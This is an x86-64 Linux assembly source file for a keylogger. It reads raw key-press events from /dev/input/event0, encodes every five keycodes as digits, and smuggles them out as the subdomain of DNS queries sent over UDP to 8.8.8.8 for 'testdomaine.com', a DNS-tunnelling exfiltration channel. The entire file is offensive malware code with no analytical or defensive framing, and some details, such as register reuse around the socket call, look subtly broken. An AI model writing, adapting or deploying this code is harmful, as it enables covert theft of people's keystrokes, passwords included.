%define INPUT_EVENT_SIZE 24 ; in octets

section .bss
    key_temp resb 3
    buffer resb INPUT_EVENT_SIZE
    key_temp_concat resb 10 ; we will save the touch values ​​5 at a time (each one is 2 bytes)

section .data
    key_log db "key_log", 0
    event0_file_path db "/dev/input/event0"
    fd dq 0

    ip_socket:
        dw 2              ; AF_INET (ipv4)
        dw 0x3500         ; port 53
        dd 0x08080808     ; 8.8.8.8
        dq 0              ; padding

    dns_query:
        db 0x12,0x34        ; ID (random 16 bit number)
        db 0x01,0x00        ; Flags (standard query RD=1)
        db 0x00,0x01        ; QDCOUNT (1 = question)
        db 0x00,0x00        ; ANCOUNT
        db 0x00,0x00        ; NSCOUNT
        db 0x00,0x00        ; ARCOUNT
        db 10               ; padding
    
    subdomain_space:
        times 10 db 0       ; subdomaine (key_temp_concat)

        db 11,"testdomaine"
        db 3,"com"
        db 0

        db 0x00,0x01        ; QTYPE A
        db 0x00,0x01        ; QCLASS IN

    query_len equ $-dns_query

section .text
    global _start

_start:
    mov r10, 0

    mov rax, 2 ; open event0 file
    mov rdi, event0_file_path
    mov rsi, 0
    mov rdx, 0
    syscall

    mov [fd], rax ; save file descriptor of event0

reading_new_key:
    mov rax, 0 ; read INPUT_EVENT_SIZE (24 octets) in event0
    mov rdi, [fd]
    mov rsi, buffer
    mov rdx, INPUT_EVENT_SIZE
    syscall

    ; filter only “key pressed” events
    mov ax, [buffer + 16] ; type = ev_key
    cmp ax, 1
    jne reading_new_key
    mov eax, [buffer + 20]  ; value = press
    cmp eax, 1
    jne reading_new_key

    ; get the keycode and convert it from bin to ASCII
    movzx rax, word [buffer + 18] ; key code
    mov rbx, 10
    xor rdx, rdx
    div rbx                         ; rax = quotient, rdx = reste
    add al, '0'                     ; quotient -> ASCII
    add dl, '0'                     ; reste -> ASCII
    mov [key_temp], al
    mov [key_temp+1], dl

    mov al, [key_temp]
    mov [key_temp_concat+r10], al
    inc r10

    mov al, [key_temp+1]
    mov [key_temp_concat+r10], al
    inc r10

    jmp test_concat_size

test_concat_size:
    cmp r10, 10
    jne reading_new_key ; nb of touches pressed != 5

    mov r10, 0
    jmp send_dns_request

    jmp reading_new_key

send_dns_request:
    mov rax, 41         ; sys_socket
    mov rdi, 2          ; AF_INET
    mov rsi, 2          ; SOCK_DGRAM
    mov rdx, 17         ; IPPROTO_UDP
    syscall
    mov r10, rax

    mov rsi, key_temp_concat  ; src : key_temp_concat
    mov rdi, subdomain_space  ; dst : subdomain_space
    mov rcx, 10               ; nb bytes to copy
    rep movsb                 ; for bytes in rcx : rdi += rsi[bytes]

    mov rax, 44         ; sys_sendto
    mov rdi, r10        ; file descriptor du socket
    mov rsi, dns_query  ; buffer containing the constructed query
    mov rdx, query_len  ; size of the request
    xor r10, r10        ; flags = 0
    mov r8, ip_socket   ; structure sockaddr_in
    mov r9, 16          ; structure size of sockaddr_in
    syscall

    jmp reading_new_key

exit:
    mov rax, 60
    xor rdi, rdi
    syscall